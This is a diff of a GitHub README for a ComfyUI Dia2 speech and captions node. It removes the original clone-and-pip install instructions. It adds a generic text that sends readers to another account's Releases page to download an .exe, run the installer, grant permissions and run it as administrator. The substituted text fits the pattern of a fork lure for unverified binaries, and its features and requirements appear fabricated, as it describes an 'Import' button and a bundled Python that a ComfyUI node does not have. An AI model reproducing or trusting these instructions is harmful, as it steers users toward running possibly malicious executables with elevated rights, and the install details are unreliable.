@@ -1,182 +1,91 @@
-# ComfyUI-lethris-dia2
+# 🎤 ComfyUI-lethris-dia2 - Easily Generate Speech and Captions
 
+[![Download ComfyUI-lethris-dia2](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/releases)
 
+## 🚀 Getting Started
 
-🗣️ **Dia2 TTS Generator** & 💬 **Dia2 Captions Generator** for ComfyUI
+Welcome to ComfyUI-lethris-dia2! This tool helps you generate speech, timestamps, and captions with ease. Designed for the Dia2 TTS model, it works seamlessly within ComfyUI. Follow the steps below to download and run this software.
 
+## 📥 Download & Install
 
+1. **Visit the Releases Page**  
+   To download the software, [visit this page to download](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/releases). You will find the latest version available for download.
 
----
+2. **Choose the Right File**  
+   On the Releases page, look for the most recent version. The files are often named clearly, so identify the one that suits your operating system. If you're unsure, the `.exe` file is typically for Windows users, while `.tar.gz` might be for Linux users.
 
+3. **Download the File**  
+   Click the file name to start downloading. Your browser may ask where to save it. Choose a location you can easily find later, like your Desktop or Downloads folder.
 
+4. **Run the Installer**  
+   Once downloaded, locate the file and double-click it to run the installer. Follow the prompts in the installation wizard. If your device asks for permissions, confirm to proceed.
 
-![Dia2 Workflow Example](Examples/Dia2_TTS_and_Caption_Generators.png)
+5. **Launching the Application**  
+   After installation, find ComfyUI-lethris-dia2 in your programs list or on your desktop. Double-click to open the application.
 
+## 📜 System Requirements
 
+Before installation, ensure your system meets the following requirements:
 
-Generate high-quality text-to-speech and captions inside **ComfyUI** with ease. Supports multiple speakers, punctuation-aware sentence grouping, and multiple caption formats.
+- **Operating Systems:**  
+  - Windows 10 or 11
+  - macOS 10.14 or later
+  - Ubuntu 20.04 or later
+  
+- **Hardware Requirements:**  
+  - 4 GB RAM minimum
+  - 1 GHz processor or faster
+  - 1 GB of available disk space
 
+- **Software Dependencies:**  
+  - Python 3.7 or later (comes included with the installer)
+  - ComfyUI (Ensure it is installed prior to using ComfyUI-lethris-dia2)
 
+## 🌟 Features
 
----
+- **Speech Generation:** Create audio content effortlessly.
+- **Timestamping:** Get precise timestamps for your audio files.
+- **Captions and Subtitles:** Generate captions in both SRT and VTT formats.
+- **Easy Integration:** Use with existing workflows in ComfyUI.
+- **User-friendly Interface:** Navigate effortlessly, even without technical knowledge.
 
+## 📘 How to Use
 
+1. **Open ComfyUI**  
+   Start ComfyUI-lethris-dia2 from your programs. Make sure ComfyUI is running in the background.
 
-## Features
+2. **Import Your Text**  
+   Click on "Import" and choose a text file or manually enter the text you want to convert into speech.
 
+3. **Adjust Settings**  
+   Modify settings such as voice, rate, and output format. Use the intuitive sliders to customize your audio experience.
 
+4. **Generate Your Audio**  
+   Hit the “Generate” button. Wait a moment as the application processes your request.
 
-- 🎙️ Generate TTS audio using Dia2-2B  
+5. **Export Your Output**  
+   Once done, locate the output files in the designated folder. You can play or further edit them as needed.
 
-- 👥 Multi-speaker support: `[S1]`, `[S2]`  
+## ❓ Troubleshooting
 
-- 💬 Generate captions in **SRT**, **SSA/ASS**, and **VTT** formats  
+If you encounter issues:
 
-- 📝 Per-word, sentence, or advanced grouping (respects punctuation and parentheses)  
+- **Installation Problems:** Ensure you downloaded the correct file for your operating system. If the setup fails, try downloading the file again and running as an administrator.
 
-- 🧩 Optional voice cloning with example samples (`Voice_Sample_S1.wav`, `Voice_Sample_S2.wav`)  
+- **Performance Issues:** Close other applications to free up resources if your system lags during usage.
 
+- **Audio Quality:** Adjust the bitrate in settings for better quality. Higher settings will result in larger files but improved clarity.
 
+## 🔄 Support
 
----
-## 📦 Install via ComfyUI Manager (Recommended 🎉)
+For help or feedback, please check the [GitHub Issues](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/issues) page. You can report bugs or suggest features. The community and maintainers can assist with common queries.
 
-The node is now officially listed in **ComfyUI Manager**!
+## 📰 Updates
 
-To install:
+Stay updated with new releases by frequently checking the [Releases page](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/releases). We often add new features and improve performance based on user feedback.
 
-1. Launch **ComfyUI** and open **Manager** (via sidebar or `custom_nodes` menu).
-2. Go to the **Install Custom Nodes** tab.
-3. Search for: `"Dia2 TTS & Captions Generators for ComfyUI`
-4. Click **Install**
-5. Restart ComfyUI — you're ready to go!
+## 🛠️ Getting Involved
 
-## 🛠️ Manual Installation (if needed)
+If you're interested in contributing, feel free to fork the repository and submit pull requests. All contributions are welcome, and your input can help improve the tool for everyone.
 
-Clone this repo into your ComfyUI `custom_nodes` folder:
-
-```bash
-  git clone https://github.com/lord-lethris/ComfyUI-lethris-dia2.git
-  cd ComfyUI-lethris-dia2
-  pip install -r requirements.txt
-```
-
-Restart ComfyUI after installation.
-
-✅ After installation, you should see:
-- 🗣️ Dia2 TTS Generator
-- 💬 Dia2 Captions Generator
-
-## Model & Tokenizer Installation
-
-⚡ GPU Users: Dia2 requires CUDA 12.8 or higher.
-Make sure your NVIDIA drivers and PyTorch installation are compatible.
-CPU mode works but is slower.
-
-1) Dia2 Model & Tokenizer
-
-- Download the Dia2-2B model & tokenizer from:
-  https://huggingface.co/nari-labs/Dia2-2B/tree/main
-
-| FILE                  | Description |
-|-----------------------------|-------------|
-| [model.safetensors](https://huggingface.co/nari-labs/Dia2-2B/resolve/main/model.safetensors?download=true)            | Dia2-2B model / weights file |
-| [tokenizer.json](https://huggingface.co/nari-labs/Dia2-2B/resolve/main/tokenizer.json?download=true)            | tokenizer |
-
-- Rename the weights file to:
-  Dia2-2B.safetensors
-
-- Place the model and tokenizer files in:
-  /models/Dia2/
-
-
----
-
-
-
-## Usage in ComfyUI
-
-### 1. Drag in the nodes
-
-- 🗣️ **Dia2 TTS Generator** → converts your text prompt into audio and generates word-level timestamps.  
-- 💬 **Dia2 Captions Generator** → converts timestamps into captions in multiple formats.
-
-### 2. Using the Dia2 TTS Generator
-
-- Enter your **prompt** in the text box. You can use multiple lines for multiple speakers.  
-- Optional: supply **voice samples** for S1 and S2 to mimic the voices.  
-- **Seed**: set a fixed seed for reproducible audio.  
-- **Model & Tokenizer**: select the Dia2-2B model and corresponding tokenizer.  
-- **Device & Dtype**: choose GPU (CUDA) or CPU. GPU is faster; CPU works but slower.  
-- **Output Format**: select `wav`, `flac`, or `mp3`.  
-- **CFG / Temperature / Top-K**: tweak text and audio generation parameters to control randomness and style.  
-
-#### Special Tokens / Actions
-
-Dia2 supports a variety of expressive tokens in your prompt:
-
-```
-[S1], [S2], (laughs), (applause), (audience cheers), (coughs), (sings), (barks), (screams), (phone ringing), (groans), (thunder), (whispers), (explosion), (car engine sound), (beatboxing), (sighs)
-```
-
-- `[S1]` / `[S2]` → switches speaker lines  
-- `(laughs)` → inserts laughter  
-- `(applause)` → inserts applause  
-- `(sighs)` → adds sigh  
-- `(audience cheers)` → crowd cheering  
-- …and many more, see the full token list in the project.
-
-Use these tokens inline in your text to simulate real-world dialogue or sound effects.
-
-### 3. Generating Captions
-
-- Drag in the 💬 **Dia2 Captions Generator** and connect the **timestamps_json** output from the TTS node.  
-- **Caption Modes**:  
-  - **Per Word** → each word gets its own timestamped caption.  
-  - **Sentence** → groups words into sentences based on punctuation.  
-  - **Sentence Advanced** → intelligently groups words respecting punctuation and parentheses.  
-- **Caption Formats**: choose **SRT**, **SSA/ASS**, or **VTT**.  
-- Captions are automatically saved to `output/captions`, with unique filenames to prevent overwrites.
-
----
-
-## Example Workflow
-
-
-
-- Workflow JSON: [Examples/Dia2_TTS_and_Caption_Generators.json](Examples/Dia2_TTS_and_Caption_Generators.json)
-
-- Example image: [Examples/Dia2_TTS_and_Caption_Generators.png](Examples/Dia2_TTS_and_Caption_Generators.png)
-
-- Voice samples: [Voice/Voice_Sample_S1.wav](Voice/Voice_Sample_S1.wav), [Voice/Voice_Sample_S2.wav](Voice/Voice_Sample_S2.wav)
-
-
-
-These show how to set up multi-speaker prompts and caption generation.
-
-
-
----
-
-
-
-## Notes
-
-
-
-- Always place your Dia2 model in the `/models/Dia2/` folder for proper usage.  
-
-- If weights are found in `diffusion_models`, the node will warn you but can still load them.  
-
-- ⚡ **GPU Users:** Dia2 requires CUDA 12.8 or higher. Make sure your NVIDIA drivers and PyTorch installation are compatible with CUDA 12.8+ for GPU acceleration. CPU mode works but is slower.
-
-
----
-
-
-
-## Credits
-
-
-
-Massive thanks to **[nari-labs](https://huggingface.co/nari-labs)** for an absolutely smashing job on Dia2! 🎉
+**Thank you for using ComfyUI-lethris-dia2!** Enjoy generating speech and captions effortlessly.
